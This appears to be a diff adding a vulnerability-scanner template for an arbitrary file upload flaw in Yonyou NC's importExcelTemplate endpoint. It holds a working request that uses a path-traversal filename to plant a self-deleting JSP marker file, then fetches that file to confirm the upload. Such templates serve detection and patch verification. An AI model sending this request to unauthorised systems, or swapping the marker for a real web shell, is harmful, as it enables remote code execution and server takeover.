@@ -1,0 +1,51 @@
+id: yonyou-nc-importExcelTemplate-fileupload
+info:
+  name: 用友 NC importExcelTemplate 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 用友NC的importExcelTemplate模块存在任意文件上传漏洞。攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现远程代码执行或服务器控制，影响系统的完整性和安全性。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ba8c3814uqbyfoug
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair: 尽快更新官方补丁,官方关于此漏洞的公告：https://security.yonyou.com/#/noticeInfo?id=729
+    version:
+  tags: fileupload,yonyou,nc
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNAL3EsrdN90G1hgq
+        Content-Length: 334
+
+        ------WebKitFormBoundaryNAL3EsrdN90G1hgq
+        Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\{{filename}}.jsp"
+        application/octet-stream
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryNAL3EsrdN90G1hgq--
+        
+        
+      
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
